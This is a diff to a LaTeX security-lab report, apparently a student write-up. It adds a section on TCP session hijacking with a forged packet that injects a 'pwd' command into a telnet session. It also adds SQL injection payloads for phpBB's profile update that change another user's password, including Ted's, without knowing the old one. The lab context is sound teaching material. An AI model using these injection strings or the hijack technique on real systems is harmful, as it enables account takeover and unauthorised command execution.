@@ -150,6 +150,38 @@ In this attack our task was to cause a Denial of Service using SYN flood attack.
 
 In the attack, an attacker sends multiple SYN packets without responding to SYN-ACK. This is done by randomizing the IP address in the original SYN request, so that the response goes to nobody as a consequence. This causes the server to keep many \'half-open\'' connections.
 
+\subsection{Hijacking TCP session}
+
+\includegraphics[width=450px]{gfx/request.png}\\
+\includegraphics[width=450px]{gfx/response.png}
+
+\begin{verbatim}
+Command 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --... :
+IP______________________________________________________________.
+|version|  ihl  |      tos      |            totlen             |
+|___4___|___5___|____0x00=0_____|___________0x002D=45___________|
+|              id               |r|D|M|       offsetfrag        |
+|_________0x5731=22321__________|0|1|0|________0x0000=0_________|
+|      ttl      |   protocol    |           checksum            |
+|____0x40=64____|____0x06=6_____|____________0xCB91_____________|
+|                            source                             |
+|___________________________10.0.2.5____________________________|
+|                          destination                          |
+|___________________________10.0.2.4____________________________|
+TCP_____________________________________________________________.
+|          source port          |       destination port        |
+|_________0xC860=51296__________|___________0x0017=23___________|
+|                            seqnum                             |
+|_____________________0x360868E2=906520802______________________|
+|                            acknum                             |
+|_____________________0x37E27287=937587335______________________|
+| doff  |r|r|r|r|C|E|U|A|P|R|S|F|            window             |
+|___5___|0|0|0|0|0|0|0|1|1|0|0|0|__________0x1B00=6912__________|
+|           checksum            |            urgptr             |
+|_________0x966E=38510__________|___________0x0000=0____________|
+70 77 64 0d  00                                     # pwd..
+__END_OF_PROGRAM__
+\end{verbatim}
 
 \section{XSS attacks}
 
@@ -193,9 +225,10 @@ However, because MySQL prevents query stacking when using \texttt{mysql\_query} 
 
 \subsection{Updating user profile}
 
-Put the following into the user signature:
-\texttt{Chaningbob`' WHERE user\_id=4\#}
+Our aim is to change Bob's password using known account of Alice. Bob's user ID is 4 which easy to check as it shows for example in the URL for sending private messages on the forum. We put the following code into the user signature of user Alice:
+\texttt{Chaningbob' WHERE user\_id=4 \#}
 
+We also provide old Alice's password and new password, that will be assigned to Bob. This way we break the following query:
 \lstset{
 	captionpos=b,
 	frame=single,
@@ -207,12 +240,17 @@ Put the following into the user signature:
 $sql = "UPDATE " . USERS_TABLE . "
 SET " . $username_sql . $passwd_sql . "user_email = '" . $email ."', user_icq = '" . str_replace("\'", "''", $icq) . "', user_website = '" . str_replace("\'", "''", $website) . "', user_occ = '" . str_replace("\'", "''", $occupation) . "', user_from = '" . str_replace("\'", "''", $location) . "', user_interests = '" . str_replace("\'", "''", $interests) . "', user_sig = '" . str_replace("\'", "''", $signature) . "', user_sig_bbcode_uid = '$signature_bbcode_uid', user_viewemail = $viewemail, user_aim = '" . str_replace("\'", "''", str_replace(' ', '+', $aim)) . "', user_yim = '" . str_replace("\'", "''", $yim) . "', user_msnm = '" . str_replace("\'", "''", $msn) . "', user_attachsig = $attachsig, user_allowsmile = $allowsmilies, user_allowhtml = $allowhtml, user_allowbbcode = $allowbbcode, user_allow_viewonline = $allowviewonline, user_notify = $notifyreply, user_notify_pm = $notifypm, user_popup_pm = $popup_pm, user_timezone = $user_timezone, user_dateformat = '" . str_replace("\'", "''", $user_dateformat) . "', user_lang = '" . $user_lang . "', user_style = $user_style, user_active = $user_active, user_actkey = '" . str_replace("\'", "''", $user_actkey) . "'" . $avatar_sql . " WHERE user_id = $user_id";
 \end{lstlisting}
+Now we can see that Alice's signature changes, but not her password:\\
+\includegraphics[]{gfx/sql/changed_bob.png}\\
+As well as we can log in to Bob account using the password we provided in the previous form:\\
+\includegraphics[]{gfx/sql/chainging_alice.png}\\
 
+We can also show that we can modify a password without knowing any user's password. We can get access to a user account using first attack. Then we can inject SQL statement in the signature with a new password that is an md5 hash of our choice:\\
+For Ted's password: \texttt{', user\_password = \"1a1dc91c907325c69271ddf0c944bc72a WHERE userid = 6 \# '}\\
+And that way we can take control on every account and by-pass mechanism in PhpBB that prevents changing the password without providing the old one first.
 
-Without knowing current user's password; md5 of "pass"\\
-For Ted's password: \texttt{', user_password = "1a1dc91c907325c69271ddf0c944bc72a" WHERE user_id = 6 # '}
-
-%Mention debug mode
+Another interesting finding is that if we create malformed SQL statement, we can debug it since a debug mode is turned on on the server. This allows us to see details of the SQL query without having access to the code. In real production servers debug messages should never be printed for that reason.\\
+\includegraphics[width=450px]{gfx/sql/debug.png}
 
 \subsection{Countermeasures}
 
